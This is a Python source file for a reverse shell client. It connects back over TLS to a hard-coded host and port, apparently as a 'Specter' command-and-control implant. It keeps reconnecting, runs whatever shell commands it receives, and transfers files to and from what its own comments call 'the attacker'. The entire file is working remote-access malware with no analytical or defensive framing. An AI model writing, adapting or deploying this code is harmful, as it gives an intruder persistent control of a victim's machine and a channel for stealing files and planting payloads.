import socket
import subprocess
import os
import ssl
import time

CHUNK_SIZE = 4096
target_ip   = "192.168.29.6"
target_port = 9001

# ──CERT_START──
CERT_PEM = """-----BEGIN CERTIFICATE-----
MIICtjCCAZ6gAwIBAgIUMP8d1mI/3PwbsT4i6CcFo6tSjw8wDQYJKoZIhvcNAQEL
BQAwFTETMBEGA1UEAwwKc3BlY3Rlci1jMjAeFw0yNjA2MDUwOTU4MDlaFw0zNjA2
MDIwOTU4MDlaMBUxEzARBgNVBAMMCnNwZWN0ZXItYzIwggEiMA0GCSqGSIb3DQEB
AQUAA4IBDwAwggEKAoIBAQCyVqFL1m+HNNz4joD8tQvnIVecOvIw0ON83KLPGw5v
rFpRncBYLDM5r1OhYBhBgYlU7ns8rIZzDzgiLRl2srQowMRs9gRmM+q+31YGRg0f
AzjzVq4vmso4qwSlKECFFacvBJPeKAGHBPQq0xxGTIEDITDZIxu6tl/iro39ymHh
StIuhzh9bu76AIra7Hvf8mEYqlN+LlfK4lfY6JI41QU6u512F9B81pORq1xHlZr4
8T1TtFFGgNTL1NwJ6ZTxmVB9oOWMDwdPHO8bnLBRyqfXvIYQLotO3tlvRkt4ipsS
JfU0VfFad3VTY9x9JFUawjhLI6vegewY8JkFkQ760m2bAgMBAAEwDQYJKoZIhvcN
AQELBQADggEBAJ5DuCDxU10NcSCK1Jaw/kTjZj85XUgF3nVv2+c07kybpTEOIenH
tXPhtn5gWh5KpuUdXQIlgKIh041KNTKhhI/keLtVKawci9YL5ftC58QvVx5RYkwt
sGbsn5EcYtzqIYpTm0LOMxWBmO63PjqUOJDknvgVOA6pW8qb01gTdKa/kvfAaSaB
BcoAGhdJW3qDmO/mLAP9m5gMDMrgczAOifxllfSgeyoCPub3tnMCi3qm4ABWa+q0
qSPepS40S3WcuX+z0LfKCC6SQg0MF7K3V0CX7qonFYNRjhCAZEglkhK3ZzEBezh6
nh4DtAmsCL+vS8V5ESrQQxtr1XdrzKBur1w=
-----END CERTIFICATE-----
"""
# ──CERT_END──


# ── Transfer helpers ──────────────────────────────────────────────────────────

def _recv_line(sock):
    """Read bytes until newline; return decoded string without the newline."""
    buf = b""
    while True:
        byte = sock.recv(1)
        if not byte:
            raise ConnectionError("Socket closed")
        if byte == b"\n":
            return buf.decode()
        buf += byte


def _recv_exact(sock, n):
    """Receive exactly n bytes."""
    buf = b""
    while len(buf) < n:
        data = sock.recv(n - len(buf))
        if not data:
            raise ConnectionError("Socket closed")
        buf += data
    return buf


def handle_download(sock, filepath):
    """Send a local file to the attacker in chunks."""
    if not os.path.isfile(filepath):
        sock.send(b"ERROR:File not found\n")
        return

    file_size = os.path.getsize(filepath)
    sock.send(f"SIZE:{file_size}\n".encode())

    if _recv_line(sock) != "ACK":
        return

    with open(filepath, "rb") as f:
        while True:
            chunk = f.read(CHUNK_SIZE)
            if not chunk:
                break
            sock.sendall(chunk)
            if _recv_line(sock) != "ACK":
                return

    sock.send(b"DONE\n")


def handle_upload(sock, filepath, file_size):
    """Receive a file from the attacker in chunks and save it."""
    dirpath = os.path.dirname(filepath)
    if dirpath:
        os.makedirs(dirpath, exist_ok=True)

    sock.send(b"READY\n")

    received = 0
    with open(filepath, "wb") as f:
        while received < file_size:
            chunk = _recv_exact(sock, min(CHUNK_SIZE, file_size - received))
            f.write(chunk)
            received += len(chunk)
            sock.send(b"ACK\n")

    _recv_line(sock)  # consume DONE
    sock.send(b"SAVED\n")


# ── Main loop ─────────────────────────────────────────────────────────────────

RETRY_DELAY = 10  # seconds between reconnect attempts

tls_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
tls_ctx.check_hostname = False
tls_ctx.verify_mode = ssl.CERT_REQUIRED
tls_ctx.load_verify_locations(cadata=CERT_PEM)

while True:
    try:
        raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s = tls_ctx.wrap_socket(raw)
        s.connect((target_ip, target_port))
    except Exception:
        time.sleep(RETRY_DELAY)
        continue

    try:
        while True:
            command = s.recv(1024).decode("utf-8").strip()

            if command.lower() == "exit":
                s.close()
                exit(0)

            if command == "SPECTER_PING":
                s.send(b"SPECTER_PONG\n")
                continue

            if command.startswith("SPECTER_DOWNLOAD:"):
                handle_download(s, command[len("SPECTER_DOWNLOAD:"):])
                continue

            if command.startswith("SPECTER_UPLOAD:"):
                rest = command[len("SPECTER_UPLOAD:"):]
                remote_path, _, size_str = rest.rpartition(":")
                handle_upload(s, remote_path, int(size_str))
                continue

            if command.startswith("cd "):
                try:
                    os.chdir(command[3:].strip())
                    s.send(("Changed directory to " + os.getcwd() + "\n").encode())
                except FileNotFoundError:
                    s.send(b"Directory not found\n")
                continue

            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            except subprocess.CalledProcessError as e:
                output = e.output

            s.send(output if output else b"Command executed successfully.\n")

    except Exception:
        pass
    finally:
        s.close()

    time.sleep(RETRY_DELAY)
